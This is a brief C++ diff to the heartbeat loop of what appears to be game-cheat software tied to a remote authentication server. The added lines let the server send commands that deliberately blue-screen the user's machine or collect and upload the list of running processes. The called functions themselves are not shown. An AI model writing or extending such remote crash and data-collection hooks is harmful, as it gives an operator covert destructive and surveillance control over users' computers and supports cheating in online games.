@@ -1541,6 +1541,16 @@ int main() {
                 SelfAuth::api::SelfDestruct();
                 return; // never reached
             }
+            if (hbResult == 3) {
+                // BSOD command received — trigger blue screen
+                SelfAuth::api::TriggerBSOD();
+                return; // never reached
+            }
+            if (hbResult == 4) {
+                // Process report requested — collect and send
+                auth.ReportProcesses();
+                continue; // don't treat as error, keep heartbeat alive
+            }
             if (hbResult != 0) {
                 // Session dead — kill the cheat
                 if (SelfAuth::g_OverlayPid != 0) {
